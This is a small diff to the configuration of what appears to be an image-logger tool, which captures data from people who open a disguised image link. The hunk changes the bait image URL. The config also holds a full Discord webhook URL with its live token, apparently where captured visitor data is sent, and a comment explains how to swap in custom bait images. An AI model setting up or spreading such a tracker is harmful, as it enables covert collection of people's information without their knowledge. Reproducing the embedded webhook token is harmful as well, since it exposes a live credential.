@@ -10,7 +10,7 @@ author = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1383630136108257321/RsMcTx5r277rxis6PK2BlfRJ7cOjdB7s81Q2DR2kZynAfXtrMjm7X0AaEvcpWiPKYmIr",
-    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQQcMCl6KrYO9RHC9CeENijCXPMz-7vC97IJXk7_xpJ-2CauDEqbz4rVMdo&s=10", # You can also have a custom image by using a URL argument
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRNQsXJYCiYsqKTdJei_KuhZHGMPQ7nudCddeFAGJ7hQHa-e9WniZOSd2s&s=10", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
